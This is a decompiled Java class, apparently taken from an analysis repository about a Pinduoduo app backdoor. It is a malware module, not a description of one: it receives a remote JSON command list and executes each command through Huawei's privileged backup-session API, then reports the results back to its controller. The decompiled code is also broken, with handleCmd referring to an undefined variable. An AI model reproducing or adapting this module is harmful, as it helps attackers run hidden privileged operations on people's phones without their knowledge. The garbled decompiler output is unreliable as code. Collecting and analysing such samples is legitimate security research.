package com.google.android.sd.biz_dynamic_dex.hw_file_cmd;

import android.content.Context;
import android.os.Handler;
import android.os.IBackupSessionCallback;
import android.os.Looper;
import android.os.Message;
import android.os.RemoteException;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import com.huawei.android.app.PackageManagerEx;
import java.util.LinkedList;
import org.json.JSONArray;
import org.json.JSONObject;

public class HwFileCmdExecutor extends DynamicCmdExecutor {
  private static final int CMD = 61;
  
  private final Handler HANDLER = new Handler(Looper.getMainLooper(), new -$$Lambda$HwFileCmdExecutor$RAsH_tHDc7AHOVoD6jr5MhORiqQ(this));
  
  private final LinkedList<String> cmdList = new LinkedList<String>();
  
  private final JSONObject cmdResult = new JSONObject();
  
  private Context context = null;
  
  private String uuid = null;
  
  private void handleCmd() {
    if (this.cmdList.isEmpty()) {
      this.HANDLER.sendEmptyMessage(2);
      return;
    } 
    final String cmd = this.cmdList.pop();
    if (TextUtils.isEmpty(str)) {
      this.HANDLER.sendEmptyMessage(1);
      return;
    } 
    try {
      int i = execCmd(str, new IBackupSessionCallback.Stub() {
            public void onTaskStatusChanged(int param1Int1, int param1Int2, int param1Int3, String param1String) throws RemoteException {
              if (param1Int3 < 0) {
                HwFileCmdExecutor hwFileCmdExecutor = HwFileCmdExecutor.this;
                String str = cmd;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("status code is ");
                stringBuilder.append(param1Int3);
                hwFileCmdExecutor.setHandleResult(str, false, stringBuilder.toString());
                HwFileCmdExecutor.this.HANDLER.sendEmptyMessage(1);
                return;
              } 
              if (param1Int3 == 0) {
                try {
                  PackageManagerEx.finishBackupSession(param1Int1);
                } catch (Exception exception) {}
                HwFileCmdExecutor.this.setHandleResult(cmd, true, "success");
                HwFileCmdExecutor.this.HANDLER.sendEmptyMessage(1);
              } 
            }
          });
      if (i < 0) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("taskId is ");
        stringBuilder.append(i);
        setHandleResult(str, false, stringBuilder.toString());
        this.HANDLER.sendEmptyMessage(1);
        return;
      } 
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("handle cmd error: ");
      stringBuilder.append(exception.getMessage());
      setHandleResult(str, false, stringBuilder.toString());
      this.HANDLER.sendEmptyMessage(1);
    } 
  }
  
  private void returnResult() {
    CmdData cmdData = new CmdData(61, this.uuid, "client", null);
    CmdHandler.dispatch(this.context, Utils.buildSucceedRespData(cmdData, this.cmdResult, null));
  }
  
  private void setHandleResult(String paramString1, boolean paramBoolean, String paramString2) {
    try {
      JSONObject jSONObject = this.cmdResult.optJSONObject(paramString1);
      if (jSONObject != null) {
        jSONObject.put("success", paramBoolean);
        jSONObject.put("msg", paramString2);
      } 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public int execCmd(String paramString, IBackupSessionCallback.Stub paramStub) {
    try {
      int i = PackageManagerEx.startBackupSession((IBackupSessionCallback)paramStub);
      return (i != -1) ? ((i == -2) ? -1 : PackageManagerEx.executeBackupTask(i, paramString)) : -1;
    } catch (Exception exception) {
      return -1;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (TextUtils.isEmpty(paramString))
      return; 
    this.context = paramContext;
    JSONObject jSONObject = new JSONObject(paramString);
    this.uuid = jSONObject.optString("uuid");
    JSONArray jSONArray = jSONObject.optJSONArray("cmd_list");
    if (jSONArray != null) {
      if (jSONArray.length() == 0)
        return; 
      for (int i = 0; i < jSONArray.length(); i++) {
        paramString = jSONArray.getString(i);
        if (!TextUtils.isEmpty(paramString)) {
          this.cmdList.add(paramString);
          JSONObject jSONObject1 = new JSONObject();
          jSONObject1.put("success", false);
          jSONObject1.put("msg", "");
          this.cmdResult.put(paramString, jSONObject1);
        } 
      } 
      this.HANDLER.sendEmptyMessage(1);
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\6932a923-9f13-4624-bfea-1249ddfd5505-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_file_cmd\HwFileCmdExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */